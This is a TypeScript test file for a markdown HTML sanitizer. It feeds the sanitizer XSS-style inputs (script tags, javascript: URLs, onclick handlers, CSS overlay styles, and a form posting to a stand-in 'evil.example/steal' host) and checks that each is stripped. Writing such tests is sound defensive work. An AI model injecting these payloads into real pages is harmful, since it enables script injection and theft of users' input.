import { describe, expect, test } from "bun:test"
import { sanitizeMarkdown } from "./markdown-cache"

// This file pins the sanitizer configuration and pure-function contract: for a
// given input, it verifies which tags, attributes, and protocols survive. It is
// not evidence of browser DOM behavior.
//
// Browser behavior is covered in real Chromium by
// `packages/app/e2e/regression/markdown-sanitize.spec.ts`. happy-dom invalidates
// its NodeIterator when the current node is removed, so later nodes can skip
// attribute sanitization. Keep every dangerous node first in these payloads;
// only the Chromium test may assert behavior after an unrelated removed node.
describe("sanitize regression (config contract)", () => {
  test("script tag is stripped", () => {
    const result = sanitizeMarkdown("<script>alert(1)</script><p>hello</p>")
    expect(result).not.toContain("<script>")
    expect(result).toContain("<p>hello</p>")
  })

  test("<svg><foreignObject> is stripped", () => {
    const result = sanitizeMarkdown("<svg><foreignObject><div>bad</div></foreignObject></svg>")
    expect(result).not.toContain("<foreignObject>")
  })

  test("javascript: URL is stripped from href", () => {
    const result = sanitizeMarkdown('<a href="javascript:alert(1)">click</a>')
    expect(result).not.toContain("javascript:")
  })

  test("custom elements are stripped", () => {
    const result = sanitizeMarkdown("<evil-el onclick='alert(1)'>bad</evil-el>")
    expect(result).not.toContain("<evil-el>")
  })

  test("kb:// citation href survives sanitization (assistant citation anchors)", () => {
    const result = sanitizeMarkdown('<a href="kb://kb_123abc" class="external-link">Note title</a>')
    expect(result).toContain('href="kb://kb_123abc"')
  })

  test("unsafe javascript: URLs stay stripped while kb:// is allowed", () => {
    const result = sanitizeMarkdown('<a href="javascript:alert(1)">bad</a><a href="kb://kb_1">good</a>')
    expect(result).not.toContain("javascript:")
    expect(result).toContain('href="kb://kb_1"')
  })

  test('target="_blank" gets noopener noreferrer', () => {
    const result = sanitizeMarkdown('<a href="https://safe.com" target="_blank">link</a>')
    expect(result).toContain("noopener")
    expect(result).toContain("noreferrer")
  })

  test("normal markdown HTML is preserved", () => {
    const result = sanitizeMarkdown("<p>hello <strong>world</strong></p>")
    expect(result).toContain("<p>hello")
    expect(result).toContain("<strong>world</strong>")
    expect(result).toContain("</p>")
  })

  test("empty input returns empty", () => {
    expect(sanitizeMarkdown("")).toBe("")
  })

  test("out-of-flow positioning is stripped while the style attribute itself survives", () => {
    const result = sanitizeMarkdown('<p style="position:fixed;inset:0;z-index:99999">OVERLAY</p>')
    expect(result).toContain("OVERLAY")
    // Removing position also neutralizes inset/z-index and returns the element to normal flow.
    expect(result).not.toContain("position:")
    // Keep the style attribute: KaTeX uses inline height/top/vertical-align for visual positioning.
    expect(sanitizeMarkdown('<span style="height:1.04em;vertical-align:-0.34em">M</span>')).toContain("height:")
  })

  test("position:absolute and sticky are stripped the same way", () => {
    expect(sanitizeMarkdown('<p style="position:absolute;top:-9999px">A</p>')).not.toContain("position:")
    expect(sanitizeMarkdown('<p style="position:STICKY;top:0">B</p>')).not.toContain("position:")
    expect(sanitizeMarkdown('<p style="position:relative;top:2px">C</p>')).toContain("position:")
  })

  test("transform is stripped so an in-flow element cannot paint outside its box", () => {
    expect(sanitizeMarkdown('<p style="transform:scale(50)">T</p>')).not.toContain("transform")
  })

  test("form elements and their action attribute are stripped", () => {
    const result = sanitizeMarkdown(
      '<form action="https://evil.example/steal"><input type="text" name="q"><button type="submit">go</button></form>FORMPROBE',
    )
    expect(result).toContain("FORMPROBE")
    expect(result).not.toContain("<form")
    expect(result).not.toContain("action=")
    expect(result).not.toContain("<input")
    expect(result).not.toContain("<button")
  })

  // Preserving images is deliberate: the server CSP allows img-src 'self' data: https:
  // (packages/aigcfroge/src/server/shared/ui.ts), and timeline-playground.stories.tsx
  // uses ![Alt text](…) as a rendering fixture. The remote-image beacon surface is
  // tracked in docs/technical-debt.md as a separate CSP decision, not a sanitizer ban.
  test("markdown images are preserved (remote, data: and root-relative)", () => {
    for (const src of ["https://example.com/x.png", "data:image/png;base64,iVBORw0KGgo=", "/local/file.png"]) {
      const result = sanitizeMarkdown(`<p><img src="${src}" alt="alt"></p>`)
      expect(result).toContain("<img")
      expect(result).toContain(src)
    }
  })
})
